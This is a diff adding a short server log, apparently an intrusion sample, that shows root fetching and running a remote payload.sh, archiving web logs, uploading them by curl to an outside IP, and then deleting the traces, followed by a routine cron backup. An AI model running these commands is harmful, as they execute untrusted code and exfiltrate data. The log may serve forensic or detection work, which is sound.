@@ -1,0 +1,8 @@
+Jan 12 08:18:02 server root: wget http://185.122.21.55/payload.sh -O /tmp/payload.sh
+Jan 12 08:18:05 server root: chmod +x /tmp/payload.sh
+Jan 12 08:18:07 server root: /tmp/payload.sh
+Jan 12 08:18:22 server root: tar -czf /tmp/logs_backup.tar.gz /var/www/html/logs/
+Jan 12 08:18:30 server root: curl -X POST -F "file=@/tmp/logs_backup.tar.gz" http://185.122.21.55/upload
+Jan 12 08:19:15 server root: rm -f /tmp/payload.sh /tmp/logs_backup.tar.gz
+Jan 12 09:30:22 server cron[7823]: (root) CMD (tar -czf /home/backups/daily.tar.gz /var/log/)
+Jan 12 09:30:25 server root: tar -czf /home/backups/daily.tar.gz /var/log/ completed
